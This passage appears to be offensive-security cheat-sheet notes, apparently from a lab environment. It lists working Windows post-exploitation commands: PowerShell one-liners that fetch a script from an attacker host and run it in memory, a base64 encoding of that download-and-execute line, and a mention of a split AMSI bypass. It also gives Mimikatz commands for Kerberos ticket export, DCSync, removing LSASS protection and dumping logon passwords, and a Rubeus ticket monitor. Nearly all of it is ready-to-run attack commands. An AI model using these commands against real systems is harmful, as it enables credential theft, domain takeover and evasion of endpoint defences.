Bypass folder of web server will have AMSI bypass splitted and loaded in parts, then, run whatever payload chosen.
### Powershell useful commands
```
# Load script to memory
(New-Object System.Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1') | iex
IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')

# Create credential object
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

# Encoded command
$string = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')"
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
```

### Mimikatz
```
# Export Kerberos tickets from memory
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'

# DCSync:
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:infinity.com /all"'

# Dump credentials with PPL
iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimikatz.exe -OutFile mimikatz.exe
iwr -UseBasicParsing -Uri http://192.168.45.193/Tools/mimidrv.sys -OutFile mimidrv.sys
.\mimikatz.exe
log
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
exit
```

### Rubeus
```
# Monitor Kerberos tickets on unconstrained delegation machine
Invoke-Rubeus -Command "monitor /internal:5"
```


